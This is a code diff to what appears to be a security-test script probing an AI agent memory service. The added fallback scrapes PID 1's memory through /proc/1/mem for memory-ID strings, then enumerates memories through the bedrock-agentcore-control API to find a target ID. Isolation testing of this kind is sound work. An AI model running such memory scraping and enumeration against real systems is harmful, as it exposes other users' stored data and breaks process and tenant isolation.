@@ -156,6 +156,74 @@ def main():
     print(f"RECON_REGION={region}")
     print(f"ALICE_ACTOR_ID={alice_actor}")
 
+    # Fallback: if memory_id not in env, try discovering it from the heap or via API
+    if not memory_id:
+        print("RECON_FALLBACK=scanning_heap_for_memory_id")
+        try:
+            # Scan /proc/1/mem for memory-id-shaped strings (format: word_word-XXXXXXXXXX)
+            import re as _re
+            mem_id_pattern = _re.compile(rb'(acab[a-z0-9_]{3,30}-[A-Za-z0-9]{8,12})')
+            regions = []
+            with open('/proc/1/maps', 'r') as f:
+                for line in f:
+                    parts = line.split()
+                    if len(parts) >= 2 and parts[1].startswith('rw') and (len(parts) < 6 or not parts[5]):
+                        addr = parts[0].split('-')
+                        regions.append((int(addr[0], 16), int(addr[1], 16)))
+            candidates = set()
+            with open('/proc/1/mem', 'rb') as mem:
+                for start, end in regions:
+                    if end - start > 50_000_000:
+                        continue
+                    try:
+                        mem.seek(start)
+                        chunk = mem.read(end - start)
+                        for m in mem_id_pattern.finditer(chunk):
+                            candidates.add(m.group(0).decode())
+                    except Exception:
+                        continue
+            # Also look for any string containing the known memory-id format
+            # Try broader pattern if acab didn't match
+            if not candidates:
+                generic_pattern = _re.compile(rb'([a-z][a-z0-9_]{5,30}-[A-Za-z0-9]{8,14})')
+                with open('/proc/1/mem', 'rb') as mem:
+                    for start, end in regions[:20]:
+                        if end - start > 10_000_000:
+                            continue
+                        try:
+                            mem.seek(start)
+                            chunk = mem.read(end - start)
+                            for m in generic_pattern.finditer(chunk):
+                                val = m.group(0).decode()
+                                if 'memory' in val.lower() or 'mem' in val.lower():
+                                    candidates.add(val)
+                        except Exception:
+                            continue
+            if candidates:
+                # Pick the most likely one (contains 'mem' or 'memory')
+                memory_candidates = [c for c in candidates if 'mem' in c.lower()]
+                if memory_candidates:
+                    memory_id = memory_candidates[0]
+                else:
+                    memory_id = sorted(candidates)[0]
+                print(f"RECON_HEAP_MEMORY_ID={memory_id}")
+            else:
+                print("RECON_HEAP_MEMORY_ID=not_found")
+        except Exception as e:
+            print(f"RECON_HEAP_ERR={type(e).__name__}: {str(e)[:100]}")
+
+    if not memory_id:
+        # Last resort: try boto3 list_memories (GetMemory is in toolkit-default)
+        try:
+            import boto3 as _boto3
+            _bacc = _boto3.client('bedrock-agentcore-control', region_name=region)
+            mems = _bacc.list_memories(maxResults=5).get('memories', [])
+            if mems:
+                memory_id = mems[0]['id']
+                print(f"RECON_API_MEMORY_ID={memory_id}")
+        except Exception as e:
+            print(f"RECON_API_ERR={type(e).__name__}: {str(e)[:100]}")
+
     if not memory_id:
         print("VERDICT=FAIL_NO_MEMORY_ID")
         return
